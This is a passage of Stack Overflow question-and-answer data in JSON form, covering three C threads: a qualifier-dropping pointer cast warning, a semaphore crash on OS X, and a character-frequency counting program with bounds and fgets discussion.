4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 1093, "user_id": 1571801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b739aed4dad18fc8844f52352fd554a2?s=128&d=identicon&r=PG", "display_name": "atturri", "link": "https://stackoverflow.com/users/1571801/atturri"}, "edited": false, "score": 0, "creation_date": 1461767541, "post_id": 36892583, "comment_id": 61350008, "body": "@atturri: C99 is <b>not</b> C standard!"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461767767, "post_id": 36892583, "comment_id": 61350200, "body": "The dangers are not just because of removing <code>const</code> as that is a guarantee the programmer gives and just results in less optimised code, but possibly worse because of the <code>volatile</code> qualifier which changes semantics for the compiler."}, {"owner": {"reputation": 1093, "user_id": 1571801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b739aed4dad18fc8844f52352fd554a2?s=128&d=identicon&r=PG", "display_name": "atturri", "link": "https://stackoverflow.com/users/1571801/atturri"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1461767949, "post_id": 36892583, "comment_id": 61350358, "body": "@Olaf. I don&#39;t mind if it&#39;s the <b>current</b> standard or not. It is the standard where the quote in the question can be read. You will not find that quote in the latest C standard."}, {"owner": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "reply_to_user": {"reputation": 1093, "user_id": 1571801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b739aed4dad18fc8844f52352fd554a2?s=128&d=identicon&r=PG", "display_name": "atturri", "link": "https://stackoverflow.com/users/1571801/atturri"}, "edited": false, "score": 0, "creation_date": 1461768067, "post_id": 36892583, "comment_id": 61350451, "body": "@atturri actually I copy pasted that from static analysis tool. Iam not sure if its correct"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 1093, "user_id": 1571801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b739aed4dad18fc8844f52352fd554a2?s=128&d=identicon&r=PG", "display_name": "atturri", "link": "https://stackoverflow.com/users/1571801/atturri"}, "edited": false, "score": 0, "creation_date": 1461771269, "post_id": 36892583, "comment_id": 61352976, "body": "@atturri: There is only one C standard and that is not C99! This question explicitly asks about the C standard, so it <b>very well</b> minds if C99 is standard or not."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461771831, "post_id": 36892583, "comment_id": 61353423, "body": "1) Rather than describe the warning: &quot;got that warning&quot;, posting the exact warning is more useful. 2) When citing the standard, best to either a) use the current standard (now C11) or include the version of the standard used like &quot;ISO C Standard (C99 6.3.16.1)&quot; 3) Is this as simple as <code>func()</code> is declared <i>after</i> its use?"}, {"owner": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461773049, "post_id": 36892583, "comment_id": 61354377, "body": "@chux it is exact copy paste of QAC static analysis output. But code is imitation of problematic code"}], "answers": [{"comments": [{"owner": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "edited": false, "score": 0, "creation_date": 1461767519, "post_id": 36892729, "comment_id": 61349989, "body": "Atturi you are quite right but this code generated by matlab and changing it manually is not suggested. Actually I am trying to understand if that error is genuine or not"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "edited": false, "score": 2, "creation_date": 1461767706, "post_id": 36892729, "comment_id": 61350142, "body": "@batgun: That error is indeed critical. And IMHO a tool which generates unnecessary and (potentially) dangerous casts should be trashed asap. That is even more true for widely used tools."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "edited": false, "score": 0, "creation_date": 1461767897, "post_id": 36892729, "comment_id": 61350310, "body": "@batgun In this particular case, if you have not left out any relevant code, it is false alarm. But if code uses pointer for which <code>volatile</code> has been removed for other purposes, it can be potentially harmful."}, {"owner": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461768001, "post_id": 36892729, "comment_id": 61350400, "body": "@olaf what do you think about prototype of func(). It has volatile const in it&#39;s definition. So it will re-gain const qualifier in that function? For example when I try to change value in that function scope,compiler is angry withme"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "edited": false, "score": 1, "creation_date": 1461768393, "post_id": 36892729, "comment_id": 61350742, "body": "@batgun Yes, if you pass pointer to unqualified type as function argument, and argument is pointer to qualified type, then those qualifications are &quot;gained&quot; for the duration of the function, as long as you access it through that argument variable."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461771068, "post_id": 36892729, "comment_id": 61352836, "body": "There actually is a third exception in the standard."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "edited": false, "score": 0, "creation_date": 1461771112, "post_id": 36892729, "comment_id": 61352871, "body": "@batgun: Did you read my other comment? <code>const</code> is the less of a problem than the <code>volatile</code> qualifier. I think I was quite clear about my position. Maybe you have to parametrise the tool or update. It is definitively a fault you should report if that is the current version."}, {"owner": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461771819, "post_id": 36892729, "comment_id": 61353413, "body": "@olaf you are right but as we discussed with user694733 cant we justify that warning with that clarification?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "edited": false, "score": 0, "creation_date": 1461772377, "post_id": 36892729, "comment_id": 61353826, "body": "@batgun: Not sure what you mean with &quot;justify that warning&quot;. The warning is very well justified. I&#39;d not give any guarantee every compiler will handle that correctly; at least it depends on the overall context (I somehow doubt you showed all code). I&#39;d either think about not using Mathlab for this code or check if there is a way to get it generate correct code. After all, there is no need for the cast at all. I&#39;d be worries about which other &quot;flaws&quot; (or actual errors) it produces."}, {"owner": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "edited": false, "score": 0, "creation_date": 1461772974, "post_id": 36892729, "comment_id": 61354321, "body": "Actually its imitation of problematic code. As lt&#39;s seen lt ls not an error and can be justified with a pcomment in our project. This is very huge project,probably more than you expected so it would be very hard to solve all problems especially when it is Matlab output."}], "tags": [], "owner": {"reputation": 1093, "user_id": 1571801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b739aed4dad18fc8844f52352fd554a2?s=128&d=identicon&r=PG", "display_name": "atturri", "link": "https://stackoverflow.com/users/1571801/atturri"}, "is_accepted": false, "score": 1, "last_activity_date": 1461767413, "last_edit_date": 1461767413, "creation_date": 1461767091, "answer_id": 36892729, "question_id": 36892583, "link": "https://stackoverflow.com/questions/36892583/dangerous-pointer-cast-results-in-loss-of-const-qualification/36892729#36892729", "title": "Dangerous pointer cast results in loss of const qualification", "body": "<p>You just need to remove the <code>(signed int *)</code> cast you have in your call to the function. Variable <code>batu</code> and the argument <code>p2</code> expected at the function are of the same type (see below), qualifiers included, so you don't need a cast at all.</p>\n\n<p>An array type is always automatically converted to its equivalent pointer type except when it's an input to the <code>sizeof</code> or unary <code>&amp;</code> operators. From the C standard 6.3.2.1/3.</p>\n"}], "owner": {"reputation": 856, "user_id": 5179382, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/2a8f76c6d3e70868a2fbc6c2afc92c97?s=128&d=identicon&r=PG", "display_name": "batgun", "link": "https://stackoverflow.com/users/5179382/batgun"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 759, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1461767413, "creation_date": 1461766762, "question_id": 36892583, "link": "https://stackoverflow.com/questions/36892583/dangerous-pointer-cast-results-in-loss-of-const-qualification", "title": "Dangerous pointer cast results in loss of const qualification", "body": "<p>According to the ISO C Standard (6.3.16.1), a pointer can only be assigned to another pointer if \"both operands are pointers to qualified or unqualified versions of compatible types, and the type pointed to by the left has all of the qualifiers of the type pointed to by the right\". \nI got that warning in my static analyses tool, But I am not sure if there is a real problem or not. Because as you can see at the code below, that pointer will be passed to function that has \"const\" qualifier in it's prototype</p>\n\n<pre><code>int main()\n{\n    static volatile const signed int batu[5] = {1,2,3,4,5};\n    unsigned int x = 5;\n    func(x, (signed int *) batu);\n}\n\nsigned int func(unsigned int p1, volatile const signed int *p2)\n{\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "macos", "semaphore"], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 6261930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e703958ac525e355eab8d845f7eccd21?s=128&d=identicon&r=PG", "display_name": "Jo&#227;o", "link": "https://stackoverflow.com/users/6261930/jo%c3%a3o"}, "edited": false, "score": 0, "creation_date": 1461767253, "post_id": 36892740, "comment_id": 61349767, "body": "Thanks for you help! I&#39;ll try to implement the code you gave me"}], "tags": [], "owner": {"reputation": 842, "user_id": 3431018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/ec7e7c6e6ed3cbe22d7f6179fe8870e9?s=128&d=identicon&r=PG", "display_name": "rafaelcpalmeida", "link": "https://stackoverflow.com/users/3431018/rafaelcpalmeida"}, "is_accepted": true, "score": 1, "last_activity_date": 1461767119, "creation_date": 1461767119, "answer_id": 36892740, "question_id": 36892548, "link": "https://stackoverflow.com/questions/36892548/semaphore-keeps-crashing-on-os-x/36892740#36892740", "title": "Semaphore keeps crashing on OS X", "body": "<p>You shouldn't use <code>sem_t</code> on OS X, you should use <code>semaphore_t</code>.</p>\n\n<p>You need to import the following libraries</p>\n\n<pre><code>#include &lt;mach/semaphore.h&gt;\n#include &lt;mach/task.h&gt;\n#include &lt;mach/mach_init.h&gt;\n</code></pre>\n\n<p>And you can create your semaphores using:</p>\n\n<pre><code>semaphore_create(mach_task_self(), &amp;shared.full, SYNC_POLICY_FIFO, 0);\nsemaphore_create(mach_task_self(), &amp;shared.empty, SYNC_POLICY_FIFO, shared.buffSize);\n</code></pre>\n\n<p>Your problem should be solved using this approach.</p>\n"}], "owner": {"reputation": 23, "user_id": 6261930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e703958ac525e355eab8d845f7eccd21?s=128&d=identicon&r=PG", "display_name": "Jo&#227;o", "link": "https://stackoverflow.com/users/6261930/jo%c3%a3o"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "accepted_answer_id": 36892740, "answer_count": 1, "score": 2, "last_activity_date": 1461767119, "creation_date": 1461766686, "last_edit_date": 1461766776, "question_id": 36892548, "link": "https://stackoverflow.com/questions/36892548/semaphore-keeps-crashing-on-os-x", "title": "Semaphore keeps crashing on OS X", "body": "<p>I have the following code:</p>\n\n<pre><code>sem_t *semFull = sem_open(\"/semFull\", O_CREAT, 0644, 0);\nsem_t *semEmpty = sem_open(\"/semEmpty\", O_CREAT, 0644, shared.buffSize);\n</code></pre>\n\n<p>This piece of code works perfectly on Linux but when I try to execute it on OS X I keep getting segmentation fault</p>\n\n<p>Can anyone help me solve this issue?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 3, "creation_date": 1461766369, "post_id": 36892298, "comment_id": 61349001, "body": "<code>while(string[c] != &#39;\\n&#39;)</code> is risky. What if the user entered more than 100 characters?"}, {"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 3, "creation_date": 1461766712, "post_id": 36892298, "comment_id": 61349275, "body": "I can&#39;t reproduce your problem -- it works fine for me."}, {"owner": {"reputation": 2444, "user_id": 559644, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9oDuZ.png?s=128&g=1", "display_name": "totoro", "link": "https://stackoverflow.com/users/559644/totoro"}, "edited": false, "score": 1, "creation_date": 1461766729, "post_id": 36892298, "comment_id": 61349292, "body": "Works fine here too."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 3, "creation_date": 1461766825, "post_id": 36892298, "comment_id": 61349390, "body": "What is the input text used? What was the incorrect output?"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1461767017, "post_id": 36892298, "comment_id": 61349556, "body": "I guess: Do you want a separated frequency of lower and upper case chars?"}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 2, "creation_date": 1461767186, "post_id": 36892298, "comment_id": 61349701, "body": "I <b>do</b> understand that this kind of &quot;homework&quot; assignments plays it quick &amp; dirty on what constitutes a &quot;letter&quot;, but it still p{...}ses me off to no end. There are more than 26 letters existing. Better get into the habit of remembering that, and coding appropriately, right from the start. Those are bad habits, and they are hard to break once you aquired them. Jos&#233; wants to keep his four letters, <code>Stra&#223;e</code> becomes <code>STRASSE</code> in uppercase, and if you&#39;re in Turkey, the uppercase <code>I</code> becomes <code>\u0131</code>, not <code>i</code>..."}, {"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "reply_to_user": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 1, "creation_date": 1461767872, "post_id": 36892298, "comment_id": 61350290, "body": "@DevSolar I sort of agree with you, but C doesn&#39;t play very well with Unicode. For a beginner it would be too much."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1461769276, "post_id": 36892298, "comment_id": 61351468, "body": "@JohnColeman: The problem being, beginners getting away with this over and over and over and over again. Every new generation of engineers blissfully unaware of all the problems that <i>proper</i> text handling involves. Not even as much as <code>&lt;ctype.h&gt;</code> in sight, let alone a hint at <a href=\"http://icu-project.org/apiref/icu4c/\" rel=\"nofollow noreferrer\">ICU</a>. It just winds me up."}, {"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "reply_to_user": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1461770018, "post_id": 36892298, "comment_id": 61352002, "body": "@DevSolar It is probably easier for a student who learns to program in C to later on learn a Unicode-friendly language like Python than it would be for a student who learns in something like Python to later on learn to understand the fine points of pointers and memory management. On the whole I still think that C is the best first language for anyone who wants to <i>really</i> learn programming, even at the cost of initially restricting the student to the ascii universe."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1461770316, "post_id": 36892298, "comment_id": 61352254, "body": "@JohnColeman: You misunderstood my meaning. I consider it negligent in the extreme for any C instructor, or C tutorial, or indeed answerer of a SO question, to not <b>immediately</b> point at such constructs and go &quot;broken!!!&quot;. (Indeed, it doesn&#39;t take Unicode to break the OP&#39;s program, EBCDIC would be sufficient.) Instead, we&#39;ve basically given up. It&#39;s not &quot;Unicode-unfriendliness&quot; of C that&#39;s killing the language, it&#39;s that we allowed it to get to the point where we no longer bother to point out such mistakes. &quot;Ah well, it&#39;s C, it&#39;s a beginner, he&#39;ll be cushioned by Python...&quot; -- bleh."}, {"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "reply_to_user": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1461770899, "post_id": 36892298, "comment_id": 61352709, "body": "@DevSolar I&#39;ve taught C programming on a couple of occasions and have <i>always</i> mentioned that C&#39;s native handling of strings is seriously deficient. Forget about issues of encoding, it is just silly to have to do a linear scan for <code>\\0</code> to determine the length of a string. I suspect that most instructors point out some of these weaknesses. As far as needing to <i>immediately</i> point it out -- we all have our pet peeves. I tend to reserve my wrath for <code>gets()</code> :)"}, {"owner": {"reputation": 61, "user_id": 5791885, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/27301ad8ec704ea49d131cdf72372e28?s=128&d=identicon&r=PG&f=1", "display_name": "Bitan Basak", "link": "https://stackoverflow.com/users/5791885/bitan-basak"}, "reply_to_user": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1461785260, "post_id": 36892298, "comment_id": 61362428, "body": "@JohnColeman If my input consists of upper case alphabets it does not count it. I want to ignore the case while counting. I mean &#39;a&#39; and &#39;A&#39; both should be considered as &#39;a&#39; ignoring the case."}, {"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1461788144, "post_id": 36892298, "comment_id": 61364211, "body": "@BitanBasak I just saw your screenshot and am unable to replicate that behavior. Either the code you posted isn&#39;t the code you are running or (perhaps) there is something nonstandard about your terminal."}, {"owner": {"reputation": 2444, "user_id": 559644, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9oDuZ.png?s=128&g=1", "display_name": "totoro", "link": "https://stackoverflow.com/users/559644/totoro"}, "edited": false, "score": 0, "creation_date": 1461797400, "post_id": 36892298, "comment_id": 61368672, "body": "@BitanBasak There is <b>no</b> problem with the counting in the code presented. Will you please try and compile and run that code and see if you can reproduce. And if you can, give us more information. And also no need for screenshots, just paste the output into your question."}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 4, "creation_date": 1461767098, "post_id": 36892649, "comment_id": 61349628, "body": "<code>while (c &lt; 100 &amp;&amp; string[c] != &#39;\\0&#39;)</code> is not needed.  <code>string[c] != &#39;\\0&#39;</code> is sufficient.  <code>string[]</code> will be null character terminated if <code>fgets()</code> does not return <code>NULL</code>"}, {"owner": {"reputation": 2444, "user_id": 559644, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9oDuZ.png?s=128&g=1", "display_name": "totoro", "link": "https://stackoverflow.com/users/559644/totoro"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461767386, "post_id": 36892649, "comment_id": 61349892, "body": "@chux I didn&#39;t know that about <code>fgets()</code>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1461767739, "post_id": 36892649, "comment_id": 61350171, "body": "Corner case:  when <code>stdin</code> is closed, <code>fgets()</code> may return with the <code>string[]</code> having less than 100 characters read into it and still lack a <code>&#39;\\n&#39;</code>.  In such a case the <code>string[c] = &#39;\\0&#39;;</code> is a problem.  Interestingly, there is no need for code to lop off the potential trailing <code>&#39;\\n&#39;</code>."}, {"owner": {"reputation": 2444, "user_id": 559644, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9oDuZ.png?s=128&g=1", "display_name": "totoro", "link": "https://stackoverflow.com/users/559644/totoro"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461768530, "post_id": 36892649, "comment_id": 61350859, "body": "@chux Edited for the corner case."}], "tags": [], "owner": {"reputation": 2444, "user_id": 559644, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9oDuZ.png?s=128&g=1", "display_name": "totoro", "link": "https://stackoverflow.com/users/559644/totoro"}, "is_accepted": false, "score": 3, "last_activity_date": 1461768275, "last_edit_date": 1461768275, "creation_date": 1461766912, "answer_id": 36892649, "question_id": 36892298, "link": "https://stackoverflow.com/questions/36892298/calculating-the-character-frequency-in-a-string-using-c/36892649#36892649", "title": "Calculating the Character frequency in a String using C", "body": "<p>The only issue that I can see is bounds...</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>This can be entirely skipped since <code>fgets()</code> ensures a trailing <code>'\\0'</code> and you handle <code>'\\n'</code> gracefully later in your checks.</p>\n\n<pre><code>while(string[c] != '\\n') {\n    c++;\n}\nstring[c] = '\\0';\n</code></pre>\n\n<p>To remove the <code>'\\n'</code> it should be</p>\n\n<pre><code>while(string[c] &amp;&amp; string[c] != '\\n') {\n   c++;\n}\nstring[c] = '\\0';\n</code></pre>\n\n<p>and</p>\n\n<pre><code>while (string[c] != '\\0')\n</code></pre>\n\n<p>is good because of the semantics of <code>fgets()</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 61, 